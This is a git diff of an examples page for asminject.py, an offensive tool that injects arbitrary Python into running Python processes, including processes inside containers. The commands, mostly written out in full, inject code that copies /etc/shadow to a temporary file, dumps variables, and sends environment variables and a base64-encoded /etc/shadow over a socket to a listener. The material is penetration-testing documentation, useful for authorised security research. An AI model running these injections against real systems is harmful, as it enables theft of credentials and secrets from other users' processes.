@@ -1,6 +1,5 @@
 # asminject.py examples - Python
-* [Execute arbitrary Python code inside an existing Python 3 process](#execute-arbitrary-python-code-inside-an-existing-python-3-process)
-* [Execute arbitrary Python code inside an existing Python 2 process](#execute-arbitrary-python-code-inside-an-existing-python-2-process)
+* [Execute arbitrary Python code inside an existing Python process](#execute-arbitrary-python-code-inside-an-existing-python-process)
 * [Write all global or variables to standard out](#write-all-global-or-local-variables-to-standard-out)
 * [Interact with a container only via injected Python code](#interact-with-a-container-only-via-injected-python-code)
 
@@ -8,9 +7,9 @@
 
 For all Python 3 examples, refer to the <a href="docs/specialized_options.md#specifying-non-pic-code">position-independent code discussion in the specialized options document</a>. Python 3 before 3.10 is usually not position-independent, but Python 3.10 and later usually are.
 
-## Execute arbitrary Python code inside an existing Python 3 process
+## Execute arbitrary Python code inside an existing Python process
 
-Launch a harmless Python process that simulates one with access to super-secret, sensitive data.
+Launch a harmless Python process that simulates one with access to super-secret, sensitive data. This example uses Python 3, but the syntax for `asminject.py` is identical for Python 2 target processes, although of course you'd need to specify script code that's valid in Python 2.
 
 ```
 $ sudo python3 practice/python_loop.py
@@ -20,14 +19,13 @@ $ sudo python3 practice/python_loop.py
 2022-05-12T19:46:56.264897 - Loop count 2
 ```
 
-In a separate terminal, locate the process and inject some arbitrary Python code into it. Note the use of the `--non-pic-binary` option discussed in <a href="docs/specialized_options.md#specifying-non-pic-code">specialized options</a>, as this is required for Python 3.9 specifically on most(?) x86-64 Linux distributions. For other Python versions, you may or may not need to exclude the option.
+In a separate terminal, locate the process and inject some arbitrary Python code into it. 
 
 This payload requires one variable: `pythoncode`, which should contain the Python script code to execute in the existing Python process.
 
 ```
 # python3 ./asminject.py 2037475 execute_python_code.s \
    --relative-offsets-from-binaries \
-   --non-pic-binary "/usr/bin/python3\\.[0-9]+" \
    --var pythoncode "import os; import sys; finput = open('/etc/shadow', 'rb'); foutput = open('/tmp/bishopfox.txt', 'wb'); foutput.write(finput.read()); foutput.close(); finput.close();"
    
 ...omitted for brevity...
@@ -44,49 +42,37 @@ bin:*:18704:0:99999:7:::
 sys:*:18704:0:99999:7:::
 ```
 
-## Execute arbitrary Python code inside an existing Python 2 process
-
-If you're targeting a legacy Python 2 process instead of Python 3, you'll most likely need to omit the `--non-pic-binary` option, e.g. same as the previous example, except:
-
-```
-# python3 ./asminject.py 2144294 execute_python_code.s \
-   --relative-offsets-from-binaries \
-   --var pythoncode "import os; import sys; finput = open('/etc/shadow', 'rb'); foutput = open('/tmp/bishopfox.txt', 'wb'); foutput.write(finput.read()); foutput.close(); finput.close();"
-```
-
 ## Write all global or local variables to standard out
 
-Use [the following Python code, which was based on this Stack Overflow discussion](https://stackoverflow.com/questions/633127/viewing-all-defined-variables)
+Use [the following Python 3 code, which was based on this Stack Overflow discussion](https://stackoverflow.com/questions/633127/viewing-all-defined-variables)
 
 Global variables:
 
 ```
-tmp = globals().copy(); [print(k,'  :  ',v,' type:' , type(v)) for k,v in tmp.items() if not k.startswith('_') and k!='tmp' and k!='In' and k!='Out' and not hasattr(v, '__call__')]
+tmp = globals().copy(); [print(k,'  :  ',v,' type:' , type(v)) for k,v in tmp.items()]
 ```
 
 
 Local variables:
 
 ```
-tmp = locals().copy(); [print(k,'  :  ',v,' type:' , type(v)) for k,v in tmp.items() if not k.startswith('_') and k!='tmp' and k!='In' and k!='Out' and not hasattr(v, '__call__')]
+tmp = locals().copy(); [print(k,'  :  ',v,' type:' , type(v)) for k,v in tmp.items()]
 ```
 
-e.g.
-
-```
-# python3 ./asminject.py 249594 execute_python_code.s \
-   --relative-offsets-from-binaries \
-   --non-pic-binary "/usr/bin/python3\\.[0-9]+" \
-   --var pythoncode "tmp = globals().copy(); [print(k,'  :  ',v,' type:' , type(v)) for k,v in tmp.items() if not k.startswith('_') and k!='tmp' and k!='In' and k!='Out' and not hasattr(v, '__call__')]"
-```
-
-or
+e.g. for global variables:
 
 ```
 # python3 ./asminject.py 249594 execute_python_code.s \
    --relative-offsets-from-binaries \
-   --non-pic-binary "/usr/bin/python3\\.[0-9]+" \
-   --var pythoncode "tmp = locals().copy(); [print(k,'  :  ',v,' type:' , type(v)) for k,v in tmp.items() if not k.startswith('_') and k!='tmp' and k!='In' and k!='Out' and not hasattr(v, '__call__')]"
+   --var pythoncode "tmp = globals().copy(); [print(k,'  :  ',v,' type:' , type(v)) for k,v in tmp.items()]"
+```
+
+or for local variables:
+
+```
+# python3 ./asminject.py 249594 execute_python_code.s \
+   --relative-offsets-from-binaries \
+   --var pythoncode "tmp = locals().copy(); [print(k,'  :  ',v,' type:' , type(v)) for k,v in tmp.items()]"
 ```
 
 Example output:
@@ -151,10 +137,8 @@ Inject the Python code into the target process using the `execute_python_code.s`
 
 ```
 # python3 ./asminject.py 2378331 execute_python_code.s \
-	--arch x86-64 \
-	--relative-offsets relative-offsets-docker-fedora-python3.10.txt \
-	--relative-offsets relative-offsets-docker-fedora-libpython3.10.txt \
-	--stop-method "slow" \
+	--relative-offsets /usr/bin/python3.10 relative-offsets-docker-fedora-python3.10.txt \
+	--relative-offsets /usr/lib64/libpython3.10.so.1.0 relative-offsets-docker-fedora-libpython3.10.txt \
 	--var pythoncode 'import os; print(os.environ);'
 ```
 
@@ -179,7 +163,8 @@ Then, in another terminal:
 
 ```
 # python3 ./asminject.py 2378331 execute_python_code.s \
-   --relative-offsets relative-offsets-docker-fedora-libpython3.10.txt \
+   --relative-offsets /usr/bin/python3.10 relative-offsets-docker-fedora-python3.10.txt \
+   --relative-offsets /usr/lib64/libpython3.10.so.1.0 relative-offsets-docker-fedora-libpython3.10.txt \
    --var pythoncode 'import os; import socket; s = socket.socket(); s.connect((\"127.0.0.1\", 7777)); s.send(f\"{os.environ}\".encode()); s.close()'
 ```
 
@@ -196,7 +181,8 @@ Copy a file out of the container:
 
 ```
 # python3 ./asminject.py 2378331 execute_python_code.s \
-   --relative-offsets relative-offsets-docker-fedora-libpython3.10.txt \
+   --relative-offsets /usr/bin/python3.10 relative-offsets-docker-fedora-python3.10.txt \
+   --relative-offsets /usr/lib64/libpython3.10.so.1.0 relative-offsets-docker-fedora-libpython3.10.txt \
    --var pythoncode 'import base64; import os; import socket; f = open(\"/etc/shadow\", mode=\"rb\"); content = f.read(); f.close(); encoded = base64.b64encode(content); s = socket.socket(); s.connect((\"127.0.0.1\", 7777)); s.send(encoded); s.close();'
 ```
 
